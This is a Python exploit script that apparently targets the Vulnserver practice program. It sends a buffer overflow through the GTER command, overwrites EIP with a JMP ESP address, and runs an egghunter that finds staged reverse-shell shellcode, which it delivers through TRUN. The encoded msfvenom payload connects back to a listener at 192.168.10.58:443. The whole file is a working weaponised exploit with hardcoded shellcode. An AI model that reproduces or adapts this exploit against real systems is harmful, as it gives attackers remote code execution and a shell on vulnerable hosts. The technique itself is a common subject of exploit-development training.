#!/usr/bin/python
# -*- coding: utf-8 -*-
# EIP OVERWRITE W/ EGGHUNTER #

import socket

#JMP ESP in essfunc.dll
offset = "\xaf\x11\x50\x62"

#JMP back into buffer to execute egghunter
jmpback = "\xeb\xc4\x90\x90"

# search for W00TW00T \x54\x30\x30\x57
egghunter = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x54\x30\x30\x57\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.10.58 LPORT=443 -e x86/shikata_ga_nai -b "\x00\x0a\x0d" -f py -v shell
# Payload size: 351 bytes
shell =  ""
shell += "T00WT00W"
shell += "\xd9\xc5\xb8\xaa\xf0\xd6\xa0\xd9\x74\x24\xf4\x5a\x2b"
shell += "\xc9\xb1\x52\x31\x42\x17\x03\x42\x17\x83\x68\xf4\x34"
shell += "\x55\x90\x1d\x3a\x96\x68\xde\x5b\x1e\x8d\xef\x5b\x44"
shell += "\xc6\x40\x6c\x0e\x8a\x6c\x07\x42\x3e\xe6\x65\x4b\x31"
shell += "\x4f\xc3\xad\x7c\x50\x78\x8d\x1f\xd2\x83\xc2\xff\xeb"
shell += "\x4b\x17\xfe\x2c\xb1\xda\x52\xe4\xbd\x49\x42\x81\x88"
shell += "\x51\xe9\xd9\x1d\xd2\x0e\xa9\x1c\xf3\x81\xa1\x46\xd3"
shell += "\x20\x65\xf3\x5a\x3a\x6a\x3e\x14\xb1\x58\xb4\xa7\x13"
shell += "\x91\x35\x0b\x5a\x1d\xc4\x55\x9b\x9a\x37\x20\xd5\xd8"
shell += "\xca\x33\x22\xa2\x10\xb1\xb0\x04\xd2\x61\x1c\xb4\x37"
shell += "\xf7\xd7\xba\xfc\x73\xbf\xde\x03\x57\xb4\xdb\x88\x56"
shell += "\x1a\x6a\xca\x7c\xbe\x36\x88\x1d\xe7\x92\x7f\x21\xf7"
shell += "\x7c\xdf\x87\x7c\x90\x34\xba\xdf\xfd\xf9\xf7\xdf\xfd"
shell += "\x95\x80\xac\xcf\x3a\x3b\x3a\x7c\xb2\xe5\xbd\x83\xe9"
shell += "\x52\x51\x7a\x12\xa3\x78\xb9\x46\xf3\x12\x68\xe7\x98"
shell += "\xe2\x95\x32\x0e\xb2\x39\xed\xef\x62\xfa\x5d\x98\x68"
shell += "\xf5\x82\xb8\x93\xdf\xaa\x53\x6e\x88\x14\x0b\x7a\x72"
shell += "\xfd\x4e\x7a\x83\x46\xc7\x9c\xe9\xa8\x8e\x37\x86\x51"
shell += "\x8b\xc3\x37\x9d\x01\xae\x78\x15\xa6\x4f\x36\xde\xc3"
shell += "\x43\xaf\x2e\x9e\x39\x66\x30\x34\x55\xe4\xa3\xd3\xa5"
shell += "\x63\xd8\x4b\xf2\x24\x2e\x82\x96\xd8\x09\x3c\x84\x20"
shell += "\xcf\x07\x0c\xff\x2c\x89\x8d\x72\x08\xad\x9d\x4a\x91"
shell += "\xe9\xc9\x02\xc4\xa7\xa7\xe4\xbe\x09\x11\xbf\x6d\xc0"
shell += "\xf5\x46\x5e\xd3\x83\x46\x8b\xa5\x6b\xf6\x62\xf0\x94"
shell += "\x37\xe3\xf4\xed\x25\x93\xfb\x24\xee\xa3\xb1\x64\x47"
shell += "\x2c\x1c\xfd\xd5\x31\x9f\x28\x19\x4c\x1c\xd8\xe2\xab"
shell += "\x3c\xa9\xe7\xf0\xfa\x42\x9a\x69\x6f\x64\x09\x89\xba"

firststage = "TRUN ." + shell

crap = "\x41" * (151 - len(egghunter) -10)
#crap = "\x90" * 70 + egghunter + "\x90" * (81 - len(egghunter))
#crap = "\x90" * (151 - len(egghunter) -10)
#print "Egghunter Length " + str(len(egghunter))
buffer = "GTER "
buffer+=crap 
buffer+=egghunter
buffer+="\x90" * 10
buffer+=offset
buffer+=jmpback

print "[*] Sending evil shenanigans - be patient"
print "[*] First Stage " + str(len(firststage)) + " bytes"
print "[*] Second Stage " + str(len(buffer)) + " bytes to server"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect(("192.168.10.178", 9999))
s.recv(1024)
s.send(firststage)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.10.178",9999))
s.recv(1024)
s.send(buffer)
s.close()
